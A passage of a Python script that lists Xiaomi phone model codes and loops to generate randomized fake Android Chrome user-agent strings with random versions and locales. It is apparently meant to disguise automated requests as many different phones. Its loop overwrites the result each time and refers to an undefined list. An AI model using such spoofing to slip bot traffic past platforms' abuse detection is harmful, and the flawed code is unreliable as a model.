    '22041219NY',
    'M2004J7BC',
    '23053RN02A',
    '23076RN4BI',
    '2212ARNC4L',
    'M2006C3MNG',
    'M2006C3MG',
    'M2101K6G',
    'M2101K7BNY',
    '2201117TG',
    '21091116AC',
    '2201116TG',
    '21091116UC',
    '2201117SY',
    '22041216C',
    '22031116BG',
    'M2007J17C',
    '2206122SC',
    '2206123SC',
    '2211133G',
    '2210132C',
    'Mi 10',
    'M2002J9G',
    'Mi 10 Pro',
    'M2102J2SC',
    'M2011K2C',
    'M2101K9AG',
    'M2102K1AC',
    'MI 8 Lite',
    'MI 8 Pro',
    'MI 9',
    'Mi 9 Lite',
    'Mi9 Pro 5G',
    'Mi 9T',
    'Mi A2',
    'Mi A2 Lite',
    'Mi A3',
    'MI A615FN',
    'MI CC 9',
    'MI CC9 Pro',
    'Mi MIX 3 5G',
    'Mi Note 10 Lite',
    'Mi Note 10 Pro',
    'M2105K81C',
    '8',
    '1906']
for xd in range(10000):
    rr = random.randint
    a=random.choice(['1','1.0','1.5','2','2.0','2.5','3','3.0','3.5','4','4.0','4.5','5','5.0','5.5','6','6.0','6.5','7','7.0','7.5','8','8.0','8.5','9','9.0','9.5','10','10.0','10.5','11','11.0','11.5','12','12.0','12.5','13','14','15.0'])
    b=random.randrange(111111,210000)
    c=random.randrange(73,100)
    d=random.randrange(4200,4900)
    e=random.randrange(40,150)
    dn=random.randrange(50,100)
    f=random.choice(['en_UK','es_US','pt_PT','ja_JP','es_NI','es_CR','pt_BR','ko_KR','fi_FI','en_US','ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
    um4 = f'''Mozilla/5.0 (Linux; Android {a}; {random.choice(modd)} Build/{rr(1111, 9999)}.0.0{rr(10, 90)}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30, 80))}.0.{str(rr(4900, 5700))}.{str(rr(70, 150))} Mobile Safari/537.36'''
    main_ua = um4
    
def random_ua():
        return random.choice(ugen)
                
                    
    
if __name__ == "__main__":menu()    